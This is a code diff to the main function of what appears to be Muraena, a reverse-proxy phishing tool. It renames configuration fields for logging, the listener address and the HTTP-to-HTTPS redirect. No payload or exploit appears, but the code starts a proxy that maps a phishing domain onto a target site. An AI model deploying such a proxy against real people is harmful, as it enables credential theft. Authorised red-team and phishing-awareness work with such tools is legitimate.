@@ -74,7 +74,7 @@ func main() {
 	}
 
 	// Init Log
-	log.Init(sess.Options, sess.Config.Proxy.Log.Enabled, sess.Config.Proxy.Log.FilePath)
+	log.Init(sess.Options, sess.Config.Log.Enabled, sess.Config.Log.FilePath)
 
 	// Load all modules
 	module.LoadModules(sess)
@@ -86,7 +86,7 @@ func main() {
 		ExternalOrigin:                sess.Config.Crawler.ExternalOrigins,
 		ExternalOriginPrefix:          sess.Config.Crawler.ExternalOriginPrefix,
 		OriginsMapping:                sess.Config.Crawler.OriginsMapping,
-		CustomResponseTransformations: sess.Config.Proxy.Transform.Response.Custom,
+		CustomResponseTransformations: sess.Config.Transform.Response.Custom,
 	}
 	if err = replacer.DomainMapping(); err != nil {
 		log.Fatal(err.Error())
@@ -101,7 +101,7 @@ func main() {
 		s.HandleFood(w, r)
 	})
 
-	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.Listener.IP, sess.Config.Proxy.Listener.Port)
+	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.Port)
 	lline := fmt.Sprintf("Muraena is alive on %s\n[ %s ] ==> [ %s ]", tui.Green(listeningAddress),
 		tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
 	log.Info(lline)
@@ -113,10 +113,10 @@ func main() {
 			CertPool: sess.Config.TLS.RootContent,
 		}
 
-		if sess.Config.Proxy.Listener.HTTPtoHTTPS.Enabled {
+		if sess.Config.Proxy.HTTPtoHTTPS.Enabled {
 			// redirect HTTP > HTTPS
-			listingHTTP := fmt.Sprintf("%s:%d", sess.Config.Proxy.Listener.IP, sess.Config.Proxy.Listener.HTTPtoHTTPS.HTTPport)
-			go http.ListenAndServe(listingHTTP, proxy.RedirectToHTTPS(sess.Config.Proxy.Listener.Port))
+			listingHTTP := fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.HTTPtoHTTPS.HTTPport)
+			go http.ListenAndServe(listingHTTP, proxy.RedirectToHTTPS(sess.Config.Proxy.Port))
 		}
 
 		if err := tlsServer.ServeTLS(listeningAddress); err != nil {
